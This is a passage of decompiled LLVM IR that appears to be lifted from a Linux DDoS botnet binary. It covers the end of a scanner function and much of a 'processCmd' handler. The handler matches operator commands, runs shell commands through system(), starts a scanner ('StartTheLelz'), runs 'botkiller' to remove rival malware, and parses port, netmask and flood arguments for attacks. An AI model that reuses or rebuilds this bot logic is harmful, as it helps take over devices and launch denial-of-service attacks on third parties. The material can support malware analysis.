  uselistorder i32 %v1_805d9ab, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_805d993, { 16, 15, 14, 12, 13, 11, 10, 9, 28, 27, 26, 8, 7, 25, 6, 4, 5, 24, 23, 22, 21, 29, 20, 19, 18, 17, 2, 3, 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805d965, { 1, 0 }
  uselistorder i32 %v5_805d8d0, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_805d86e, { 1, 0 }
  uselistorder i32 %v0_805d845, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i8** %stack_var_-108, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32* %stack_var_-48, { 1, 2, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 3, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 49, 48, 50, 52, 51, 54, 53, 55, 56, 57, 59, 58, 61, 60, 2, 62, 63 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805dd27, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805dc40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805dbdf, { 1, 0 }
  uselistorder label %dec_label_pc_805db7b, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805da9a, { 1, 0 }
  uselistorder label %dec_label_pc_805d96c, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_805d87d, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp86 = ptrtoint i32* %arg2 to i32
  %stack_var_-188 = alloca i8*, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805dd32 = load i32, i32* @edi, align 4
  %v0_805dd33 = load i32, i32* @esi, align 4
  %v0_805dd34 = load i32, i32* @ebx, align 4
  store i32 %v0_805dd34, i32* %stack_var_-16, align 4
  %v2_805dd3e = load i32, i32* %arg2, align 4
  store i32 %v2_805dd3e, i32* @eax, align 4
  %v4_805dd48 = inttoptr i32 %v2_805dd3e to i8*
  store i8* %v4_805dd48, i8** %stack_var_-188, align 4
  %v5_805dd4b = call i32 @__GI_strcoll(i8* %v4_805dd48, i32 ptrtoint ([5 x i8]* @global_var_80689d7.31 to i32))
  %v1_805dd50 = icmp eq i32 %v5_805dd4b, 0
  %v1_805dd52 = icmp eq i1 %v1_805dd50, false
  br i1 %v1_805dd52, label %dec_label_pc_805dd6e, label %dec_label_pc_805dd54

dec_label_pc_805dd54:                             ; preds = %entry
  %v0_805dd54 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805dd54 = ptrtoint i8* %v0_805dd54 to i32
  store i8* %v0_805dd54, i8** %stack_var_-188, align 4
  %v4_805dd64 = call i32 @HackerPrint(i32 %v1_805dd54, i32 ptrtoint ([6 x i8]* @global_var_806e619.1500 to i32))
  br label %dec_label_pc_805e903

dec_label_pc_805dd6e:                             ; preds = %entry
  %v2_805dd71 = load i32, i32* %arg2, align 4
  store i32 %v2_805dd71, i32* @eax, align 4
  %v4_805dd7b = inttoptr i32 %v2_805dd71 to i8*
  store i8* %v4_805dd7b, i8** %stack_var_-188, align 4
  %v5_805dd7e = call i32 @__GI_strcoll(i8* %v4_805dd7b, i32 ptrtoint ([11 x i8]* @global_var_806e61f.1501 to i32))
  %v1_805dd83 = icmp eq i32 %v5_805dd7e, 0
  %v1_805dd85 = icmp eq i1 %v1_805dd83, false
  br i1 %v1_805dd85, label %dec_label_pc_805ddb3, label %dec_label_pc_805dd87

dec_label_pc_805dd87:                             ; preds = %dec_label_pc_805dd6e
  %v0_805dd87 = load i32, i32* @global_var_8078864.1307, align 4
  %v4_805dd8c = inttoptr i32 %v0_805dd87 to i8*
  store i8* %v4_805dd8c, i8** %stack_var_-188, align 4
  %v2_805dd8f = call i32 @__GI_inet_ntoa(i32 %v0_805dd87)
  %v0_805dd94 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805dd94 = ptrtoint i8* %v0_805dd94 to i32
  store i8* %v0_805dd94, i8** %stack_var_-188, align 4
  %v4_805dda9 = call i32 @HackerPrint(i32 %v1_805dd94, i32 ptrtoint ([10 x i8]* @global_var_806e62a.1502 to i32))
  br label %dec_label_pc_805e903

dec_label_pc_805ddb3:                             ; preds = %dec_label_pc_805dd6e
  %v2_805ddb6 = load i32, i32* %arg2, align 4
  store i32 %v2_805ddb6, i32* @eax, align 4
  %v4_805ddc0 = inttoptr i32 %v2_805ddb6 to i8*
  store i8* %v4_805ddc0, i8** %stack_var_-188, align 4
  %v5_805ddc3 = call i32 @__GI_strcoll(i8* %v4_805ddc0, i32 ptrtoint ([7 x i8]* @global_var_806e634.1503 to i32))
  %v1_805ddc8 = icmp eq i32 %v5_805ddc3, 0
  %v1_805ddca = icmp eq i1 %v1_805ddc8, false
  br i1 %v1_805ddca, label %dec_label_pc_805df18, label %dec_label_pc_805ddd0

dec_label_pc_805ddd0:                             ; preds = %dec_label_pc_805ddb3
  %v12_805ddd0 = icmp eq i32 %arg1, 2
  br i1 %v12_805ddd0, label %dec_label_pc_805ddf0, label %dec_label_pc_805ddd6

dec_label_pc_805ddd6:                             ; preds = %dec_label_pc_805ddd0
  %v0_805ddd6 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805ddd6 = ptrtoint i8* %v0_805ddd6 to i32
  store i8* %v0_805ddd6, i8** %stack_var_-188, align 4
  %v4_805dde6 = call i32 @HackerPrint(i32 %v1_805ddd6, i32 ptrtoint ([23 x i8]* @global_var_806e63b.1504 to i32))
  br label %dec_label_pc_805e903

dec_label_pc_805ddf0:                             ; preds = %dec_label_pc_805ddd0
  %v1_805ddf3 = add i32 %tmp86, 4
  %v1_805ddf6 = inttoptr i32 %v1_805ddf3 to i32*
  %v2_805ddf6 = load i32, i32* %v1_805ddf6, align 4
  store i32 %v2_805ddf6, i32* @eax, align 4
  %v4_805de00 = inttoptr i32 %v2_805ddf6 to i8*
  store i8* %v4_805de00, i8** %stack_var_-188, align 4
  %v5_805de03 = call i32 @__GI_strcoll(i8* %v4_805de00, i32 ptrtoint ([4 x i8]* @global_var_806e652.1505 to i32))
  %v1_805de08 = icmp eq i32 %v5_805de03, 0
  %v1_805de0a = icmp eq i1 %v1_805de08, false
  br i1 %v1_805de0a, label %dec_label_pc_805de24, label %dec_label_pc_805de0c

dec_label_pc_805de0c:                             ; preds = %dec_label_pc_805ddf0
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_806e656.1506, i32 0, i32 0), i8** %stack_var_-188, align 4
  %v2_805de13 = call i32 @__libc_system(i32 ptrtoint ([16 x i8]* @global_var_806e656.1506 to i32))
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806ce38.1378, i32 0, i32 0), i8** %stack_var_-188, align 4
  %v2_805de1f = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_806ce38.1378 to i32))
  br label %dec_label_pc_805de24

dec_label_pc_805de24:                             ; preds = %dec_label_pc_805ddf0, %dec_label_pc_805de0c
  %v2_805de2a = load i32, i32* %v1_805ddf6, align 4
  store i32 %v2_805de2a, i32* @eax, align 4
  %v4_805de34 = inttoptr i32 %v2_805de2a to i8*
  store i8* %v4_805de34, i8** %stack_var_-188, align 4
  %v5_805de37 = call i32 @__GI_strcoll(i8* %v4_805de34, i32 ptrtoint ([9 x i8]* @global_var_806e666.1507 to i32))
  %v1_805de3c = icmp eq i32 %v5_805de37, 0
  %v1_805de3e = icmp eq i1 %v1_805de3c, false
  br i1 %v1_805de3e, label %dec_label_pc_805de61, label %dec_label_pc_805de40

dec_label_pc_805de40:                             ; preds = %dec_label_pc_805de24
  store i8* getelementptr inbounds ([122 x i8], [122 x i8]* @global_var_806e670.1508, i32 0, i32 0), i8** %stack_var_-188, align 4
  %v2_805de47 = call i32 @__libc_system(i32 ptrtoint ([122 x i8]* @global_var_806e670.1508 to i32))
  %v0_805de4c = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805de4c = ptrtoint i8* %v0_805de4c to i32
  store i8* %v0_805de4c, i8** %stack_var_-188, align 4
  %v4_805de5c = call i32 @HackerPrint(i32 %v1_805de4c, i32 ptrtoint ([20 x i8]* @global_var_806e6ea.1509 to i32))
  br label %dec_label_pc_805de61

dec_label_pc_805de61:                             ; preds = %dec_label_pc_805de24, %dec_label_pc_805de40
  %v2_805de67 = load i32, i32* %v1_805ddf6, align 4
  store i32 %v2_805de67, i32* @eax, align 4
  %v4_805de71 = inttoptr i32 %v2_805de67 to i8*
  store i8* %v4_805de71, i8** %stack_var_-188, align 4
  %v5_805de74 = call i32 @__GI_strcoll(i8* %v4_805de71, i32 ptrtoint (i32* @global_var_806e6fe.1510 to i32))
  %v1_805de79 = icmp eq i32 %v5_805de74, 0
  %v1_805de7b = icmp eq i1 %v1_805de79, false
  br i1 %v1_805de7b, label %dec_label_pc_805de9e, label %dec_label_pc_805de7d

dec_label_pc_805de7d:                             ; preds = %dec_label_pc_805de61
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @global_var_806e700.1511, i32 0, i32 0), i8** %stack_var_-188, align 4
  %v2_805de84 = call i32 @__libc_system(i32 ptrtoint ([39 x i8]* @global_var_806e700.1511 to i32))
  %v0_805de89 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805de89 = ptrtoint i8* %v0_805de89 to i32
  store i8* %v0_805de89, i8** %stack_var_-188, align 4
  %v4_805de99 = call i32 @HackerPrint(i32 %v1_805de89, i32 ptrtoint ([27 x i8]* @global_var_806e727.1512 to i32))
  br label %dec_label_pc_805de9e

dec_label_pc_805de9e:                             ; preds = %dec_label_pc_805de61, %dec_label_pc_805de7d
  %v2_805dea4 = load i32, i32* %v1_805ddf6, align 4
  store i32 %v2_805dea4, i32* @eax, align 4
  %v4_805deae = inttoptr i32 %v2_805dea4 to i8*
  store i8* %v4_805deae, i8** %stack_var_-188, align 4
  %v5_805deb1 = call i32 @__GI_strcoll(i8* %v4_805deae, i32 ptrtoint (i32* @global_var_806e742.1513 to i32))
  %v1_805deb6 = icmp eq i32 %v5_805deb1, 0
  %v1_805deb8 = icmp eq i1 %v1_805deb6, false
  br i1 %v1_805deb8, label %dec_label_pc_805dedb, label %dec_label_pc_805deba

dec_label_pc_805deba:                             ; preds = %dec_label_pc_805de9e
  store i8* getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_806e744.1514, i32 0, i32 0), i8** %stack_var_-188, align 4
  %v2_805dec1 = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_806e744.1514 to i32))
  %v0_805dec6 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805dec6 = ptrtoint i8* %v0_805dec6 to i32
  store i8* %v0_805dec6, i8** %stack_var_-188, align 4
  %v4_805ded6 = call i32 @HackerPrint(i32 %v1_805dec6, i32 ptrtoint ([27 x i8]* @global_var_806e727.1512 to i32))
  br label %dec_label_pc_805dedb

dec_label_pc_805dedb:                             ; preds = %dec_label_pc_805de9e, %dec_label_pc_805deba
  %v2_805dee1 = load i32, i32* %v1_805ddf6, align 4
  store i32 %v2_805dee1, i32* @eax, align 4
  %v4_805deeb = inttoptr i32 %v2_805dee1 to i8*
  store i8* %v4_805deeb, i8** %stack_var_-188, align 4
  %v5_805deee = call i32 @__GI_strcoll(i8* %v4_805deeb, i32 ptrtoint (i32* @global_var_806e76c.1515 to i32))
  %v1_805def3 = icmp eq i32 %v5_805deee, 0
  %v1_805def5 = icmp eq i1 %v1_805def3, false
  br i1 %v1_805def5, label %dec_label_pc_805df18, label %dec_label_pc_805def7

dec_label_pc_805def7:                             ; preds = %dec_label_pc_805dedb
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @global_var_806e770.1516, i32 0, i32 0), i8** %stack_var_-188, align 4
  %v2_805defe = call i32 @__libc_system(i32 ptrtoint ([39 x i8]* @global_var_806e770.1516 to i32))
  %v0_805df03 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805df03 = ptrtoint i8* %v0_805df03 to i32
  store i8* %v0_805df03, i8** %stack_var_-188, align 4
  %v4_805df13 = call i32 @HackerPrint(i32 %v1_805df03, i32 ptrtoint ([27 x i8]* @global_var_806e727.1512 to i32))
  br label %dec_label_pc_805df18

dec_label_pc_805df18:                             ; preds = %dec_label_pc_805dedb, %dec_label_pc_805ddb3, %dec_label_pc_805def7
  %v2_805df1b = load i32, i32* %arg2, align 4
  store i32 %v2_805df1b, i32* @eax, align 4
  %v4_805df25 = inttoptr i32 %v2_805df1b to i8*
  store i8* %v4_805df25, i8** %stack_var_-188, align 4
  %v5_805df28 = call i32 @__GI_strcoll(i8* %v4_805df25, i32 ptrtoint ([8 x i8]* @global_var_806e797.1517 to i32))
  %v1_805df2d = icmp eq i32 %v5_805df28, 0
  %v1_805df2f = icmp eq i1 %v1_805df2d, false
  br i1 %v1_805df2f, label %dec_label_pc_805df65, label %dec_label_pc_805df31

dec_label_pc_805df31:                             ; preds = %dec_label_pc_805df18
  %v0_805df31 = call i32 @listFork()
  %v1_805df36 = icmp eq i32 %v0_805df31, 0
  %v1_805df38 = icmp eq i1 %v1_805df36, false
  br i1 %v1_805df38, label %dec_label_pc_805df65, label %dec_label_pc_805df3a

dec_label_pc_805df3a:                             ; preds = %dec_label_pc_805df31
  %v0_805df3a = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805df3a = ptrtoint i8* %v0_805df3a to i32
  store i8* %v0_805df3a, i8** %stack_var_-188, align 4
  %v4_805df4a = call i32 @HackerPrint(i32 %v1_805df3a, i32 ptrtoint ([13 x i8]* @global_var_806e79f.1518 to i32))
  %v0_805df4f = call i32 @botkiller()
  %v0_805df54 = call i32 @RemoveTMP()
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805df60 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805df65

dec_label_pc_805df65:                             ; preds = %dec_label_pc_805df31, %dec_label_pc_805df18, %dec_label_pc_805df3a
  %v2_805df68 = load i32, i32* %arg2, align 4
  store i32 %v2_805df68, i32* @eax, align 4
  %v4_805df72 = inttoptr i32 %v2_805df68 to i8*
  store i8* %v4_805df72, i8** %stack_var_-188, align 4
  %v5_805df75 = call i32 @__GI_strcoll(i8* %v4_805df72, i32 ptrtoint ([7 x i8]* @global_var_806e7ac.1519 to i32))
  %v1_805df7a = icmp eq i32 %v5_805df75, 0
  %v1_805df7c = icmp eq i1 %v1_805df7a, false
  br i1 %v1_805df7c, label %dec_label_pc_805dfad, label %dec_label_pc_805df7e

dec_label_pc_805df7e:                             ; preds = %dec_label_pc_805df65
  %v0_805df7e = call i32 @listFork()
  %v1_805df83 = icmp eq i32 %v0_805df7e, 0
  %v1_805df85 = icmp eq i1 %v1_805df83, false
  br i1 %v1_805df85, label %dec_label_pc_805dfad, label %dec_label_pc_805df87

dec_label_pc_805df87:                             ; preds = %dec_label_pc_805df7e
  %v0_805df87 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805df87 = ptrtoint i8* %v0_805df87 to i32
  store i8* %v0_805df87, i8** %stack_var_-188, align 4
  %v4_805df97 = call i32 @HackerPrint(i32 %v1_805df87, i32 ptrtoint ([16 x i8]* @global_var_806e7b3.1520 to i32))
  %v0_805df9c = call i32 @LoopPayload()
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805dfa8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805dfad

dec_label_pc_805dfad:                             ; preds = %dec_label_pc_805df7e, %dec_label_pc_805df65, %dec_label_pc_805df87
  %v2_805dfb0 = load i32, i32* %arg2, align 4
  store i32 %v2_805dfb0, i32* @eax, align 4
  %v4_805dfba = inttoptr i32 %v2_805dfb0 to i8*
  store i8* %v4_805dfba, i8** %stack_var_-188, align 4
  %v5_805dfbd = call i32 @__GI_strcoll(i8* %v4_805dfba, i32 ptrtoint ([8 x i8]* @global_var_806e7c3.1521 to i32))
  %v1_805dfc2 = icmp eq i32 %v5_805dfbd, 0
  %v1_805dfc4 = icmp eq i1 %v1_805dfc2, false
  br i1 %v1_805dfc4, label %dec_label_pc_805e0a6, label %dec_label_pc_805dfca

dec_label_pc_805dfca:                             ; preds = %dec_label_pc_805dfad
  %v12_805dfca = icmp eq i32 %arg1, 2
  br i1 %v12_805dfca, label %dec_label_pc_805dfea, label %dec_label_pc_805dfd0

dec_label_pc_805dfd0:                             ; preds = %dec_label_pc_805dfca
  %v0_805dfd0 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805dfd0 = ptrtoint i8* %v0_805dfd0 to i32
  store i8* %v0_805dfd0, i8** %stack_var_-188, align 4
  %v4_805dfe0 = call i32 @HackerPrint(i32 %v1_805dfd0, i32 ptrtoint ([17 x i8]* @global_var_806e7cb.1522 to i32))
  br label %dec_label_pc_805e903

dec_label_pc_805dfea:                             ; preds = %dec_label_pc_805dfca
  %v1_805dfed = add i32 %tmp86, 4
  %v1_805dff0 = inttoptr i32 %v1_805dfed to i32*
  %v2_805dff0 = load i32, i32* %v1_805dff0, align 4
  store i32 %v2_805dff0, i32* @eax, align 4
  %v4_805dffa = inttoptr i32 %v2_805dff0 to i8*
  store i8* %v4_805dffa, i8** %stack_var_-188, align 4
  %v5_805dffd = call i32 @__GI_strcoll(i8* %v4_805dffa, i32 ptrtoint ([4 x i8]* @global_var_806e7dc.1523 to i32))
  %v1_805e002 = icmp eq i32 %v5_805dffd, 0
  %v1_805e004 = icmp eq i1 %v1_805e002, false
  br i1 %v1_805e004, label %dec_label_pc_805e047, label %dec_label_pc_805e006

dec_label_pc_805e006:                             ; preds = %dec_label_pc_805dfea
  %v0_805e006 = load i32, i32* @global_var_8078870.1524, align 16
  %v1_805e00b = icmp eq i32 %v0_805e006, 0
  br i1 %v1_805e00b, label %dec_label_pc_805e903, label %dec_label_pc_805e013

dec_label_pc_805e013:                             ; preds = %dec_label_pc_805e006
  %v4_805e020 = inttoptr i32 %v0_805e006 to i8*
  store i8* %v4_805e020, i8** %stack_var_-188, align 4
  %v4_805e023 = call i32 @kill(i32 %v0_805e006, i32 9)
  %v0_805e028 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805e028 = ptrtoint i8* %v0_805e028 to i32
  store i8* %v0_805e028, i8** %stack_var_-188, align 4
  %v4_805e038 = call i32 @HackerPrint(i32 %v1_805e028, i32 ptrtoint ([5 x i8]* @global_var_806e7e0.1525 to i32))
  store i32 0, i32* @global_var_8078870.1524, align 16
  br label %dec_label_pc_805e047

dec_label_pc_805e047:                             ; preds = %dec_label_pc_805dfea, %dec_label_pc_805e013
  %v2_805e04d = load i32, i32* %v1_805dff0, align 4
  store i32 %v2_805e04d, i32* @eax, align 4
  %v4_805e057 = inttoptr i32 %v2_805e04d to i8*
  store i8* %v4_805e057, i8** %stack_var_-188, align 4
  %v5_805e05a = call i32 @__GI_strcoll(i8* %v4_805e057, i32 ptrtoint ([3 x i8]* @global_var_806e7e5.1526 to i32))
  %v1_805e05f = icmp eq i32 %v5_805e05a, 0
  %v1_805e061 = icmp eq i1 %v1_805e05f, false
  br i1 %v1_805e061, label %dec_label_pc_805e0a6, label %dec_label_pc_805e063

dec_label_pc_805e063:                             ; preds = %dec_label_pc_805e047
  %v0_805e063 = load i32, i32* @global_var_8078870.1524, align 16
  %v1_805e068 = icmp eq i32 %v0_805e063, 0
  %v1_805e06a = icmp eq i1 %v1_805e068, false
  br i1 %v1_805e06a, label %dec_label_pc_805e903, label %dec_label_pc_805e070

dec_label_pc_805e070:                             ; preds = %dec_label_pc_805e063
  %v0_805e070 = load i8*, i8** %stack_var_-188, align 4
  %v1_805e070 = ptrtoint i8* %v0_805e070 to i32
  %v2_805e070 = call i32 @__libc_fork(i32 %v1_805e070)
  %v4_805e078 = icmp eq i32 %v2_805e070, 0
  br i1 %v4_805e078, label %dec_label_pc_805e095, label %dec_label_pc_805e07e

dec_label_pc_805e07e:                             ; preds = %dec_label_pc_805e070
  store i32 %v2_805e070, i32* @global_var_8078870.1524, align 16
  br label %dec_label_pc_805e903

dec_label_pc_805e095:                             ; preds = %dec_label_pc_805e070
  %v1_805e095 = call i32 @StartTheLelz(i32 0)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e0a1 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e0a6

dec_label_pc_805e0a6:                             ; preds = %dec_label_pc_805e047, %dec_label_pc_805dfad, %dec_label_pc_805e095
  %v2_805e0a9 = load i32, i32* %arg2, align 4
  store i32 %v2_805e0a9, i32* @eax, align 4
  %v4_805e0b3 = inttoptr i32 %v2_805e0a9 to i8*
  store i8* %v4_805e0b3, i8** %stack_var_-188, align 4
  %v5_805e0b6 = call i32 @__GI_strcoll(i8* %v4_805e0b3, i32 ptrtoint ([4 x i8]* @global_var_806e7e8.1527 to i32))
  %v1_805e0bb = icmp eq i32 %v5_805e0b6, 0
  %v1_805e0bd = icmp eq i1 %v1_805e0bb, false
  br i1 %v1_805e0bd, label %dec_label_pc_805e2e4, label %dec_label_pc_805e0c3

dec_label_pc_805e0c3:                             ; preds = %dec_label_pc_805e0a6
  %v7_805e0c7 = icmp sgt i32 %arg1, 5
  br i1 %v7_805e0c7, label %dec_label_pc_805e0cd, label %dec_label_pc_805e903

dec_label_pc_805e0cd:                             ; preds = %dec_label_pc_805e0c3
  %v1_805e0d0 = add i32 %tmp86, 12
  %v1_805e0d3 = inttoptr i32 %v1_805e0d0 to i32*
  %v2_805e0d3 = load i32, i32* %v1_805e0d3, align 4
  %v4_805e0d5 = inttoptr i32 %v2_805e0d3 to i8*
  store i8* %v4_805e0d5, i8** %stack_var_-188, align 4
  %v2_805e0d8 = call i32 @atol(i32 %v2_805e0d3)
  %v10_805e0dd = icmp eq i32 %v2_805e0d8, -1
  br i1 %v10_805e0dd, label %dec_label_pc_805e903, label %dec_label_pc_805e0e6

dec_label_pc_805e0e6:                             ; preds = %dec_label_pc_805e0cd
  %v1_805e0e9 = add i32 %tmp86, 8
  %v1_805e0ec = inttoptr i32 %v1_805e0e9 to i32*
  %v2_805e0ec = load i32, i32* %v1_805e0ec, align 4
  %v4_805e0ee = inttoptr i32 %v2_805e0ec to i8*
  store i8* %v4_805e0ee, i8** %stack_var_-188, align 4
  %v2_805e0f1 = call i32 @atol(i32 %v2_805e0ec)
  %v10_805e0f6 = icmp eq i32 %v2_805e0f1, -1
  br i1 %v10_805e0f6, label %dec_label_pc_805e903, label %dec_label_pc_805e0ff

dec_label_pc_805e0ff:                             ; preds = %dec_label_pc_805e0e6
  %v1_805e102 = add i32 %tmp86, 16
  %v1_805e105 = inttoptr i32 %v1_805e102 to i32*
  %v2_805e105 = load i32, i32* %v1_805e105, align 4
  %v4_805e107 = inttoptr i32 %v2_805e105 to i8*
  store i8* %v4_805e107, i8** %stack_var_-188, align 4
  %v2_805e10a = call i32 @atol(i32 %v2_805e105)
  %v10_805e10f = icmp eq i32 %v2_805e10a, -1
  br i1 %v10_805e10f, label %dec_label_pc_805e903, label %dec_label_pc_805e118

dec_label_pc_805e118:                             ; preds = %dec_label_pc_805e0ff
  %v1_805e11b = add i32 %tmp86, 20
  %v1_805e11e = inttoptr i32 %v1_805e11b to i32*
  %v2_805e11e = load i32, i32* %v1_805e11e, align 4
  %v4_805e120 = inttoptr i32 %v2_805e11e to i8*
  store i8* %v4_805e120, i8** %stack_var_-188, align 4
  %v2_805e123 = call i32 @atol(i32 %v2_805e11e)
  %v10_805e128 = icmp eq i32 %v2_805e123, -1
  br i1 %v10_805e128, label %dec_label_pc_805e903, label %dec_label_pc_805e131

dec_label_pc_805e131:                             ; preds = %dec_label_pc_805e118
  %v2_805e137 = load i32, i32* %v1_805e11e, align 4
  %v4_805e139 = inttoptr i32 %v2_805e137 to i8*
  store i8* %v4_805e139, i8** %stack_var_-188, align 4
  %v2_805e13c = call i32 @atol(i32 %v2_805e137)
  %v1_805e141 = add i32 %v2_805e13c, -65500
  %v6_805e141 = sub i32 65499, %v2_805e13c
  %v7_805e141 = and i32 %v6_805e141, %v2_805e13c
  %v8_805e141 = icmp slt i32 %v7_805e141, 0
  %v9_805e141 = icmp eq i32 %v1_805e141, 0
  %v10_805e141 = icmp slt i32 %v1_805e141, 0
  %v3_805e146 = icmp eq i1 %v10_805e141, %v8_805e141
  %v4_805e146 = icmp eq i1 %v9_805e141, false
  %v5_805e146 = and i1 %v4_805e146, %v3_805e146
  br i1 %v5_805e146, label %dec_label_pc_805e903, label %dec_label_pc_805e14c

dec_label_pc_805e14c:                             ; preds = %dec_label_pc_805e131
  %v2_805e152 = load i32, i32* %v1_805e105, align 4
  %v4_805e154 = inttoptr i32 %v2_805e152 to i8*
  store i8* %v4_805e154, i8** %stack_var_-188, align 4
  %v2_805e157 = call i32 @atol(i32 %v2_805e152)
  %v1_805e15c = add i32 %v2_805e157, -32
  %v3_805e15c = sub i32 31, %v2_805e157
  %v4_805e15c = and i32 %v3_805e15c, %v2_805e157
  %v5_805e15c = icmp slt i32 %v4_805e15c, 0
  %v6_805e15c = icmp eq i32 %v1_805e15c, 0
  %v7_805e15c = icmp slt i32 %v1_805e15c, 0
  %v3_805e15f = icmp eq i1 %v7_805e15c, %v5_805e15c
  %v4_805e15f = icmp eq i1 %v6_805e15c, false
  %v5_805e15f = and i1 %v4_805e15f, %v3_805e15f
  br i1 %v5_805e15f, label %dec_label_pc_805e903, label %dec_label_pc_805e165

dec_label_pc_805e165:                             ; preds = %dec_label_pc_805e14c
  %v12_805e165 = icmp eq i32 %arg1, 7
  %v1_805e169 = icmp eq i1 %v12_805e165, false
  br i1 %v1_805e169, label %dec_label_pc_805e184, label %dec_label_pc_805e16b

dec_label_pc_805e16b:                             ; preds = %dec_label_pc_805e165
  %v1_805e16e = add i32 %tmp86, 24
  %v1_805e171 = inttoptr i32 %v1_805e16e to i32*
  %v2_805e171 = load i32, i32* %v1_805e171, align 4
  %v4_805e173 = inttoptr i32 %v2_805e171 to i8*
  store i8* %v4_805e173, i8** %stack_var_-188, align 4
  %v2_805e176 = call i32 @atol(i32 %v2_805e171)
  %tmp93 = icmp slt i32 %v2_805e176, 1
  %tmp94 = icmp eq i1 %tmp93, false
  br i1 %tmp94, label %dec_label_pc_805e184, label %dec_label_pc_805e903

dec_label_pc_805e184:                             ; preds = %dec_label_pc_805e16b, %dec_label_pc_805e165
  %v1_805e187 = add i32 %tmp86, 4
  %v1_805e18a = inttoptr i32 %v1_805e187 to i32*
  %v2_805e18a = load i32, i32* %v1_805e18a, align 4
  %v2_805e195 = load i32, i32* %v1_805e0ec, align 4
  %v4_805e197 = inttoptr i32 %v2_805e195 to i8*
  store i8* %v4_805e197, i8** %stack_var_-188, align 4
  %v2_805e19a = call i32 @atol(i32 %v2_805e195)
  %v2_805e1a8 = load i32, i32* %v1_805e0d3, align 4
  %v4_805e1aa = inttoptr i32 %v2_805e1a8 to i8*
  store i8* %v4_805e1aa, i8** %stack_var_-188, align 4
  %v2_805e1ad = call i32 @atol(i32 %v2_805e1a8)
  %v2_805e1bb = load i32, i32* %v1_805e105, align 4
  %v4_805e1bd = inttoptr i32 %v2_805e1bb to i8*
  store i8* %v4_805e1bd, i8** %stack_var_-188, align 4
  %v2_805e1c0 = call i32 @atol(i32 %v2_805e1bb)
  %v2_805e1ce = load i32, i32* %v1_805e11e, align 4
  %v4_805e1d0 = inttoptr i32 %v2_805e1ce to i8*
  store i8* %v4_805e1d0, i8** %stack_var_-188, align 4
  %v2_805e1d3 = call i32 @atol(i32 %v2_805e1ce)
  br i1 %v1_805e169, label %dec_label_pc_805e203, label %dec_label_pc_805e1e1

dec_label_pc_805e1e1:                             ; preds = %dec_label_pc_805e184
  %v1_805e1e4 = add i32 %tmp86, 24
  %v1_805e1e7 = inttoptr i32 %v1_805e1e4 to i32*
  %v2_805e1e7 = load i32, i32* %v1_805e1e7, align 4
  %v4_805e1e9 = inttoptr i32 %v2_805e1e7 to i8*
  store i8* %v4_805e1e9, i8** %stack_var_-188, align 4
  %v2_805e1ec = call i32 @atol(i32 %v2_805e1e7)
  br label %dec_label_pc_805e203

